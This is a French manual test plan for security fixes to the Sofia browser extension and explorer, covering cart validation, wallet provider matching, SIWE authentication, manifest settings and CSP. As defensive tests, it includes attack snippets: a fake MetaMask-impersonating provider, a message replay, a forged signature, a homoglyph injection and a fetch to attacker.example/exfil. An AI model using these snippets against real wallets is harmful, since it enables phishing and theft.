# Security Audit — Manual Test Plan

Plan de validation pour la branche `chore/security-audit-fixes`. Chaque commit
introduit un fix de sécurité ; cette doc décrit les tests à exécuter pour
prouver que (a) le fix marche et (b) on n'a pas régressé le golden path.

Pré-requis communs :
- Build chargée : `chrome://extensions` → Developer mode → Load unpacked
  → `apps/extension/build/chrome-mv3-prod`.
- DevTools ouvertes sur le side panel (clic droit → Inspect).
- Wallet (MetaMask ou Rabby) connecté, sur Intuition mainnet (chainId 1155).

Convention :
- ✅ = comportement attendu après fix
- 🔴 = symptôme du bug si non-fixé
- 🧪 = procédure de test

---

## Phase 1 — Cart hardening

### Commit 1 — `fix(cart): lookup context triple vaultId by tuple, not array index`

**Bug** : les "context triples" (`certVault | "in context of" | topicAtom`) étaient
attachés au mauvais cert quand le cart contenait à la fois des triples nouveaux et
des triples déjà existants on-chain (parce que le service réordonnait les
résultats : créés-puis-deposits, après dédup).

🧪 **Test 1.1 — Golden path (1 cert, 1 contexte)**
1. Vider le cart.
2. Naviguer sur une URL X jamais certifiée.
3. Cocher une intention (ex: "for_work") + sélectionner un topic context (ex: "tech").
4. `Submit cart` → confirmer la TX.
5. Console : pas de `Skip context triple: no vaultId resolved`.
6. ✅ Indexer / explorer : un triple `<certVault> | in context of | tech_atom`
   doit être visible avec subject = le cert qu'on vient de créer.

🧪 **Test 1.2 — Le scénario du bug (mix créé / existant)**
1. Vider le cart.
2. Ajouter dans cet ordre :
   - URL A (nouvelle) avec intention + context "education"
   - URL B (déjà certifiée par l'utilisateur dans le passé, donc on-chain : sera
     `deposit` au lieu de `created`) avec intention + context "tech"
3. `Submit cart`.
4. ✅ Le context "education" doit pointer sur le cert de A (pas B).
   Le context "tech" doit pointer sur le cert de B.
5. 🔴 Si bug : les contextes sont inversés (le `i` positionnel mappait à
   l'ordre `created-then-deposit`, pas l'ordre des items du cart).

🧪 **Test 1.3 — Resilience**
1. Si le cart contient un item dont `predicateName` n'a pas de match dans
   `vaultIdByInputKey` (ne devrait pas arriver après commit 2 mais on teste la
   défense), le contexte de cet item est skippé avec un `logger.warn`.
2. Console : `Skip context triple: no vaultId resolved` au lieu d'un crash ou
   d'une assertion fausse on-chain.

---

### Commit 2 — `fix(cart): reject unknown predicate names at addItem boundary`

**Bug** : `cartService.addItem(... predicateName: "vіsits for work" ...)` avec un
caractère cyrillique passait, créait un atom predicate sur la chain payé par
l'utilisateur, et créait un triple invisible aux queries indexer.

🧪 **Test 2.1 — Golden path (predicates connus)**
1. Naviguer sur une URL.
2. Cocher chacune des intentions (work, learning, fun, inspiration, buying,
   music, trusts, distrust).
3. ✅ Tous les items s'ajoutent. `cartItemCount` reflète le bon nombre.

🧪 **Test 2.2 — Rejet d'un predicate inconnu (DevTools)**
Console du side panel :
```js
// Importer cartService est interne — exécuter via debug helper si exposé.
// Ou injecter un item via IndexedDB:
indexedDB.open("sofia-extension-db").onsuccess = e => {
  const db = e.target.result
  const tx = db.transaction("CART_ITEMS", "readwrite")
  tx.objectStore("CART_ITEMS").put({
    id: "0xYOURWALLET:test.example.com:vіsits for work",  // i cyrillique
    walletAddress: "0xYOURWALLET",
    url: "https://test.example.com",
    normalizedUrl: "test.example.com",
    pageTitle: "Test",
    predicateName: "vіsits for work",
    intention: null,
    faviconUrl: null,
    addedAt: Date.now()
  })
}
```
Recharger le side panel → tenter un `Submit cart`.
- ✅ La submit n'envoie aucune TX pour cet item (filtré par `isKnownPredicateName`
  côté future flow), OU le cart entry existe mais ne crée plus de predicate atom
  malicieux (selon la couche).
- ✅ Console : `Rejected unknown predicate { predicateName: "vіsits for work" }`
  si on passe par `addItem` direct.

🧪 **Test 2.3 — Sanity check au boot**
1. Recharger le side panel.
2. ✅ Console DevTools : aucun log `INTENTION_PREDICATES drift: ...`.
3. (Test régression future : si un dev ajoute un predicate dans
   `INTENTION_PREDICATES` sans l'enregistrer dans `PREDICATE_NAME_TO_ID`, ce log
   apparaîtra au boot.)

---

### Commit 3 — `fix(cart): verify vote tripleTermId exists on-chain before deposit`

**Bug** : un `vote.tripleTermId` venant du cart était déposé sans vérification
on-chain. Un indexer compromis pouvait rediriger le TRUST vers un vault attaquant.

🧪 **Test 3.1 — Golden path vote**
1. Aller sur Circle Feed Tab.
2. Voter (support ou oppose) sur 1-2 cards qui ont des triples on-chain réels.
3. `Submit cart`.
4. ✅ Vote(s) submitted, `votesSucceeded` > 0 dans le résultat.
5. ✅ Console : pas de `Skip vote: triple does not exist on-chain`.
6. ✅ Indexer : nouvelles vault positions sur les triples votés.

🧪 **Test 3.2 — Rejet d'un termId invalide**
Forcer un faux termId via DevTools :
```js
indexedDB.open("sofia-extension-db").onsuccess = e => {
  const db = e.target.result
  const tx = db.transaction("CART_ITEMS", "readwrite")
  tx.objectStore("CART_ITEMS").put({
    id: "0xYOURWALLET:fake.test:trusts:support",
    walletAddress: "0xYOURWALLET",
    url: "https://fake.test",
    normalizedUrl: "fake.test",
    pageTitle: null,
    predicateName: "trusts",
    intention: null,
    faviconUrl: null,
    addedAt: Date.now(),
    voteAction: "support",
    tripleTermId: "0x" + "00".repeat(32)  // Termid qui n'existe pas
  })
}
```
Recharger le side panel, `Submit cart`.
- ✅ Console : `Skip vote: triple does not exist on-chain` avec le termId.
- ✅ Aucune TX n'est broadcastée pour cet item.
- ✅ `votesSucceeded` ne compte pas ce vote.
- 🔴 Si bug : la TX est tentée et probablement revert dans MetaMask, mais a
   payé du gas pour rien.

🧪 **Test 3.3 — Multicall3 efficace**
1. Ajouter 5+ votes dans le cart.
2. Network tab DevTools : observer les requêtes JSON-RPC.
3. ✅ **Une seule** requête `eth_call` au contrat Multicall3
   (`0xcA11bde05977b3631167028862bE2a173976CA11`) plutôt que 5 calls séparés à
   `getTriple`.
4. Latence totale du check < 200ms (au lieu de ~1s avec sequential reads).

🧪 **Test 3.4 — Fallback si multicall3 absent (si testé sur testnet où le
contrat n'est pas déployé)**
1. Lancer en dev (`bun run dev`, testnet).
2. Si Multicall3 n'existe pas sur testnet : console doit logger
   `Multicall failed, falling back to parallel getTriple`.
3. ✅ Le check fonctionne quand même (chemin Promise.all).

---

### Commit 4 — `fix(cart): refuse submit when cart items belong to another wallet`

**Bug** : si l'utilisateur changeait de wallet entre l'ouverture du cart et le
submit, des items du wallet A pouvaient être signés par le wallet B.

🧪 **Test 4.1 — Golden path (un seul wallet)**
1. Connecter wallet A.
2. Ajouter 2-3 items au cart.
3. `Submit cart`.
4. ✅ Submit ok, tx envoyée.

🧪 **Test 4.2 — Mismatch après swap (scenario du bug)**
1. Connecter wallet A.
2. Ajouter 2 items au cart.
3. **Sans cliquer Submit**, dans le Privy / landing : déconnecter wallet A,
   connecter wallet B.
4. Revenir à l'extension. Le cart peut afficher 0 items (rechargé) OU les 2 items
   précédents selon le timing du listener.
5. Si les 2 items du wallet A apparaissent encore : cliquer `Submit`.
6. ✅ Aucune TX n'est broadcastée. Console :
   `Cart wallet mismatch — refresh the cart` avec les addresses dans les details.
7. ✅ L'UI affiche l'erreur `setError`.
8. 🔴 Si bug : la TX part avec `account: walletB` mais des items semantiquement
   liés à walletA.

---

## Phase 2 — Wallet provider & signing

### Commit 5 — `fix(wallet): strict EIP-6963 rdns matching, reject ambiguous providers`

**Bug** : `name.includes(norm)` + `norm.includes(name.split(' ')[0])` permettait
à une page d'annoncer un provider EIP-6963 nommé "M" et de matcher "metamask".
Une page malveillante pouvait alors router le signing vers son propre provider
(qui afficherait une UI imitant MetaMask).

🧪 **Test 5.1 — Golden path MetaMask / Rabby**
1. Connecter MetaMask via la landing.
2. Déclencher une action qui demande une signature/TX (ex: certifier une
   page → submit cart).
3. ✅ Le popup MetaMask s'ouvre et la TX se broadcast normalement.

🧪 **Test 5.2 — Provider impersonator (bookmarklet de test)**
1. Sur n'importe quel site HTTPS, ouvrir DevTools console.
2. Coller :
   ```js
   const fakeProvider = {
     request: async () => { alert("PWNED"); return [] }
   }
   window.addEventListener('eip6963:requestProvider', () => {
     window.dispatchEvent(new CustomEvent('eip6963:announceProvider', {
       detail: { info: { name: "M", rdns: "fake.attacker", uuid: crypto.randomUUID() }, provider: fakeProvider }
     }))
   })
   ```
3. **Note** : pour test fidèle il faut aussi désactiver MetaMask le temps du
   test (ou tester sur un profil sans wallet legit), sinon le vrai MetaMask
   aussi annonce et match en premier.
4. Avec walletType="metamask" persisté, déclencher une action de signature.
5. ✅ Console : `Selected wallet "metamask" not announced on this page (expected rdns: io.metamask, io.metamask.flask). Available: M (fake.attacker)...`
6. ✅ Aucune signature n'est routée vers le fake provider.
7. 🔴 Si bug : alert("PWNED") s'affiche, signing routé vers le fake.

🧪 **Test 5.3 — Wallet inconnu du registry (fallback strict equality)**
1. Si tu as un wallet exotique (Frame, Phantom, etc.) déclaré dans
   WALLET_RDNS_REGISTRY → le test 5.1 doit aussi marcher.
2. Si ton wallet n'est PAS dans le registry → console doit logger
   `Wallet type unknown to RDNS registry, falling back to strict equality match`.
3. Le fallback ne match que si `name === walletType` ou `rdns === walletType`
   (égalité stricte, pas substring).

---

### Commit 6 — `feat(blockchain): 1% slippage protection on deposits and redeems`

**Bug** : tous les `deposit`/`redeem`/votes passaient `minShares=0n` /
`minAssets=0n`. Un MEV bot pouvait sandwich une transaction sur la bonding
curve et siphoner la valeur (l'utilisateur recevait quasi-zéro shares pour
le même TRUST déposé).

🧪 **Test 6.1 — Golden path single deposit**
1. Cocher une intention sur une URL nouvelle, customiser le weight.
2. Submit cart → confirmer la TX.
3. ✅ La TX réussit. DevTools Network : un `eth_call` à `previewDeposit` est
   visible avant le `eth_sendTransaction`.
4. ✅ Inspecter la TX dans l'explorer : `minShares` doit être ~99% des shares
   reçues réellement (1% slippage tolerance).

🧪 **Test 6.2 — Batch deposit + GS pool**
1. Activer Global Stake (si pas déjà actif).
2. Ajouter 3+ certs au cart pour des URLs déjà existantes (ce qui force le
   fallback `executeDepositBatch`).
3. Submit.
4. ✅ Network : un `eth_call` Multicall3 (1 round trip) au lieu de N calls.
5. ✅ La TX réussit. `minShares[i]` non-zero pour chaque entry.

🧪 **Test 6.3 — Redeem (single + batch)**
1. Avoir des positions sur 2+ triples (depuis Profile → Positions).
2. Tester :
   - Redeem 1 position → ✅ TX OK, `minAssets` calculé via `previewRedeem`
   - Redeem all → ✅ TX OK, multicall preview, `redeemBatch` avec array de
     `minAssets` non-zero

🧪 **Test 6.4 — Slippage actif (théorique, hard to repro sans setup MEV)**
1. Si quelqu'un fait un gros deposit/redeem dans le même block, la curve
   bouge. Si ça fait baisser le minShares attendu de plus de 1%, la TX
   doit revert avec une erreur claire (au lieu de réussir avec ~zero shares).
2. Pour tester localement : déposer en 2 wallets en même temps depuis 2 onglets.
3. ✅ La 2ème TX revert avec `MultiVault_InsufficientShares` ou similaire.

---

### Commit 7 — `feat(auth): require SIWE proof for WALLET_CONNECTED messages`

**Bug** : la landing envoyait `{ type: WALLET_CONNECTED, walletAddress: "0x..." }`
et l'extension le croyait sans preuve cryptographique. Un XSS sur la landing
(ou tout origin allowlisté) pouvait faire afficher n'importe quel wallet
dans Sofia, ouvrant une surface de phishing.

🧪 **Test 7.1 — Golden path connect**
1. Aller sur la landing (`/auth?extensionId=...`).
2. Cliquer Connect Wallet → choisir MetaMask.
3. ✅ MetaMask popup avec un message SIWE :
   ```
   doc.sofia.intuition.box wants you to sign in with your Ethereum account:
   0xABC...

   Connect your wallet to the Sofia extension.

   URI: https://doc.sofia.intuition.box
   Version: 1
   Chain ID: 1155
   Nonce: <16 hex>
   Issued At: <now>
   ```
4. Signer.
5. ✅ La landing affiche "Wallet Connected!". L'extension a `walletAddress`
   en `chrome.storage.session`. Click "Create your first claim" déclenche
   la suite normalement.

🧪 **Test 7.2 — User refuse la signature**
1. Sur la landing, Connect Wallet → MetaMask popup.
2. Cliquer "Reject" sur le popup.
3. ✅ La landing affiche "Signature Required" avec le message d'erreur et un
   bouton "Retry signature".
4. ✅ L'extension ne reçoit PAS de `WALLET_CONNECTED` (rien dans
   `chrome.storage.session`).
5. Cliquer "Retry signature" → MetaMask popup à nouveau, accepter cette fois.
6. ✅ Connect réussi.

🧪 **Test 7.3 — Replay (anti-replay window 5 min)**
DevTools console de la landing avant le sendToExtension :
```js
// Intercepter le message envoyé pour le replayer plus tard
let captured
const orig = chrome.runtime.sendMessage
chrome.runtime.sendMessage = (extId, msg, ...rest) => {
  if (msg.type === "WALLET_CONNECTED") captured = msg
  return orig(extId, msg, ...rest)
}
```
Connecter normalement (capture du message). Attendre 6+ minutes. Renvoyer :
```js
chrome.runtime.sendMessage("<extension-id>", captured, console.log)
```
✅ Console extension : `Rejected WALLET_CONNECTED: invalid SIWE proof`
avec `reason: SIWE expired (issued ...s ago)`.

🧪 **Test 7.4 — Signature forgée**
DevTools de la landing, modifier le payload avant l'envoi :
```js
// Forge une mauvaise signature
const badPayload = {
  type: "WALLET_CONNECTED",
  walletAddress: "0xattackerWallet",  // wallet qu'on ne possède pas
  walletType: "metamask",
  siweMessage: "doc.sofia.intuition.box wants you to sign in with your Ethereum account:\n0xattackerWallet\n\n...",
  siweSignature: "0x" + "00".repeat(65)  // signature invalide
}
chrome.runtime.sendMessage("<extension-id>", badPayload, console.log)
```
✅ Réponse : `{ success: false, error: "Signature does not match claimed address" }` (ou similaire selon le `recoverMessageAddress`).
✅ `chrome.storage.session.walletAddress` n'est pas modifié.

🧪 **Test 7.5 — Domain mismatch**
Si tu as un dev qui tourne sur localhost:3000, le SIWE doit avoir
`localhost:3000 wants you to sign...`. Si quelqu'un tente d'envoyer un SIWE
avec `doc.sofia.intuition.box wants...` depuis localhost:3000 → reject :
```
Rejected WALLET_CONNECTED: invalid SIWE proof
  reason: SIWE domain mismatch (expected localhost:3000)
```

---

## Phase 3 — Manifest, dispatcher, logs

### Commit 8 — `chore(manifest): strip localhost from prod externally_connectable`

**Bug** : `http://localhost:3000/*` shippait dans le manifest prod. Tout serveur
local sur :3000 (npm dev hostile, webhook attaquant) pouvait envoyer
`WALLET_CONNECTED`/`OAUTH_TOKEN_SUCCESS` à l'extension publiée.

🧪 **Test 8.1 — `bun run build` strip ok**
1. `bun run build` (manuel).
2. ✅ Console : `[post-build] Stripped 1 localhost origin(s) from prod externally_connectable`
3. Inspecter `build/chrome-mv3-prod/manifest.json` :
   - `externally_connectable.matches` ne contient PAS `http://localhost:3000/*`
   - Contient `https://doc.sofia.intuition.box/*`

🧪 **Test 8.2 — Dev (testnet) garde localhost**
1. `bun run dev`.
2. Inspecter `build/chrome-mv3-dev/manifest.json` : localhost présent.
3. ✅ La landing locale (`localhost:3000`) peut se connecter à l'extension dev.

🧪 **Test 8.3 — Defense-in-depth runtime**
Avec build prod chargée :
- DevTools console SW : envoyer un faux `WALLET_CONNECTED` depuis un onglet
  `http://localhost:3000` (s'il existait) → message rejeté.
- Si Chrome bypass le manifest filter (ne devrait jamais arriver), le runtime
  filter dans `messageHandlers.ts` rejette aussi (`PLASMO_PUBLIC_NETWORK === 'mainnet'`).

### Commit 9 — Manifest cleanup

🧪 **Test 9 — Permissions cohérentes après build**
Inspecter `build/chrome-mv3-prod/manifest.json` :
- `permissions` contient explicitement `"scripting"`
- `host_permissions` ne contient pas `https://auth.privy.io/*`
- Le wallet bridge marche toujours (test signing existant).

### Commit 10 — `fix(messages): reject privileged messages from content scripts`

**Bug** : un content script (= script injecté sur une page web visitée) pouvait
envoyer des messages privilégiés (`LEVEL_UP_GROUP`, `CERTIFY_URL`, etc.) au SW
comme s'il venait du sidepanel.

🧪 **Test 10.1 — Repro depuis devtools content**
Sur n'importe quelle page web (HTTPS), DevTools console :
```js
chrome.runtime.sendMessage("<extension-id>", {
  type: "LEVEL_UP_GROUP",
  data: { groupId: "fake", targetLevel: 99 }
}, console.log)
```
- ✅ Réponse : `{ success: false, error: "Message not allowed from content script" }`
- ✅ Console SW : `Rejected privileged message from content script` avec l'URL
   du tab.
- ✅ Aucun side effect sur le service `levelUpService`.

🧪 **Test 10.2 — Le sidepanel marche toujours**
Test classique : open sidepanel → click "Level up" sur un group → confirm.
- ✅ Level-up s'exécute (sidepanel n'a pas `sender.tab`, pas filtré).

🧪 **Test 10.3 — Tracking telemetry passe encore**
Ouvre un site quelconque, navigue. Console SW :
- ✅ Logs `PAGE_DATA`, `URL_CHANGED`, `TRACK_URL` reçus normalement (ces messages
  sont content-script-only par design, pas dans `SIDEPANEL_ONLY_MESSAGES`).

### Commit 11 — Logs redaction

🧪 **Test 11 — Aucune leak de tokens / IPFS / calldata**
1. Connecter un compte OAuth (ex. Twitter via la landing).
2. Faire une certification d'URL (qui crée un atom IPFS).
3. Inspecter le SW console + DevTools network :
   - ✅ Pas de `console.log` brut avec emoji 📍📦✅
   - ✅ Pas de log contenant `accessToken.substring(0, 20)`
   - ✅ Pas de log contenant `responseUrl` brut (avec query/fragment)
   - ✅ `logger.debug` redacted : `{ platform, present: true }` au lieu du token

---

## Phase 4 — Explorer

### Commit 12 — On-chain triple verification

🧪 **Test 12.1 — Golden path**
1. Sur l'explorer, ajouter un cert au cart, ouvrir WeightModal.
2. ✅ Bouton submit affiche "Verifying on-chain..." brièvement (< 200ms).
3. ✅ Submit s'active une fois le multicall terminé.
4. ✅ Network tab : un seul `eth_call` au contrat Multicall3.

🧪 **Test 12.2 — Triple inexistant (simulation)**
DevTools console explorer :
```js
// Forcer un termId invalide via le store du cart (selon l'implémentation)
// Ou modifier le fetch indexer mock
```
Plus simplement : si l'indexer renvoie un termId qui n'existe pas on-chain
(possible en testnet), le warning rouge "Triple verification failed" doit
s'afficher et le submit doit être désactivé.

### Commit 13 — Display target contract

🧪 **Test 13** : ouvrir WeightModal → cost summary doit afficher
"Signing against 0x26F8…12c6c ↗" cliquable, lien vers explorer.

### Commit 14 — chain explicit

🧪 **Test 14** : faire un deposit → ✅ TX réussit, viem ne warn plus sur la
chain. Inspecter le payload signé : `chainId === 1155`.

### Commit 15 — safeHref + referrerPolicy

🧪 **Test 15.1 — Bon URL HTTPS**
- CircleCard avec `item.url = "https://example.com"` → bouton ExternalLink
  cliquable, ouvre l'URL dans nouvel onglet.

🧪 **Test 15.2 — URL malicieux**
DevTools console :
```js
// Inspecter un atom dont l'URL est "javascript:alert(1)"
// (impossible à reproduire facilement sans atom poisoning)
```
Vérification statique : `safeHref("javascript:alert(1)")` retourne `undefined`,
donc le bouton ExternalLink est masqué (`{safeHref(item.url) && (...)}`).

🧪 **Test 15.3 — Referrer policy**
Network tab → click sur une trending page → la requête favicon n'envoie pas
de header `Referer`.

### Commit 16 — CSP

🧪 **Test 16.1 — App marche en prod**
1. `bun run build` côté explorer.
2. Servir avec nginx.
3. ✅ App charge sans erreur CSP dans la console.
4. Login Privy → wallet popup → marche (frame-src whitelist Privy).
5. GraphQL queries → marchent (connect-src whitelist).

🧪 **Test 16.2 — CSP bloque l'inattendu**
DevTools console :
```js
fetch("https://attacker.example/exfil")
```
- ✅ Console : `Refused to connect to ... because it violates CSP directive`.

🧪 **Test 16.3 — Clickjacking**
Tentative d'iframe l'explorer depuis un autre domaine :
```html
<iframe src="https://explorer.intuition.box"></iframe>
```
- ✅ L'iframe reste blanc, console : `Refused to display in a frame because
  an ancestor violates the Content Security Policy directive 'frame-ancestors 'self''`.

### Commit 17 — Pinata cleanup

⚠️ **Action manuelle hors commit** :
1. Révoquer le scoped key Pinata (admin Pinata) — le JWT actuel devient mort.
2. Supprimer la ligne `PINATA_JWT="..."` de `apps/explorer/.env` et
   `sofia-explorer/.env`.
3. ✅ Vérifier qu'aucun script restant ne casse :
   `ls apps/explorer/scripts/*.mjs` — `create-platform-atoms.mjs` doit être
   absent. Les autres scripts ne dépendent plus du JWT.

### Commit 18 — OAuth encryption

🧪 **Test 18.1 — Round-trip**
1. Connecter Spotify (ou autre OAuth) via la landing.
2. DevTools console SW : `chrome.storage.local.get(null, console.log)`
3. ✅ La valeur de `oauth_token_spotify_<wallet>` est de la forme
   `{ __enc: 1, ct: "...", iv: "..." }` — pas de plaintext.
4. ✅ La session de Spotify marche (Sofia peut fetch user data → token decrypted).

🧪 **Test 18.2 — Restart browser**
1. Fermer Chrome complètement.
2. Rouvrir → la `chrome.storage.session.oauth_encryption_key` est régénérée.
3. Ouvrir Sofia → tenter une action OAuth-dépendante.
4. ✅ Console : `Token decrypt failed, removing stale ciphertext` →
   l'utilisateur doit re-OAuth (acceptable, par design).

🧪 **Test 18.3 — Migration legacy**
Si `chrome.storage.local` contient un token plaintext d'une version
antérieure :
1. ✅ Premier `getToken` log : `Migrating plaintext token to encrypted form`.
2. ✅ Le token est ré-écrit comme blob chiffré.
3. ✅ L'API caller (PlatformDataFetcher) reçoit le token en clair, pas de
   régression fonctionnelle.

---

## Phase 5 — Final rebuild & ship

⚠️ **Action manuelle obligatoire avant publication CWS** :

1. **Clean slate** :
   ```bash
   cd apps/extension
   rm -rf build/ .plasmo/
   ```
2. **Rebuild propre** :
   ```bash
   bun run build
   ```
3. **Vérifications** sur `build/chrome-mv3-prod/` :
   - `manifest.json` :
     - `externally_connectable.matches` n'a PAS `localhost`
     - `permissions` contient `"scripting"`
     - `host_permissions` ne contient PAS `auth.privy.io/*`
   - Aucun fichier `walletBridge.*.js` ou `walletRelay.*.js` (audit finding #1
     déjà résolu : ces sources sont supprimées et `.plasmo/static/` régénéré)
   - `content_scripts` ne référence PAS un walletBridge legacy
4. **Package** : `bun run package` → `.zip` pour Chrome Web Store.
5. **Smoke test final** sur le `.zip` :
   - Charger `Load unpacked` depuis le zip extrait
   - Connecter wallet via la landing → SIWE popup → signer → connexion OK
   - Faire une certification → submit cart → TX OK
   - Voter → TX OK
   - Redeem une position → TX OK avec `minAssets > 0` dans le calldata

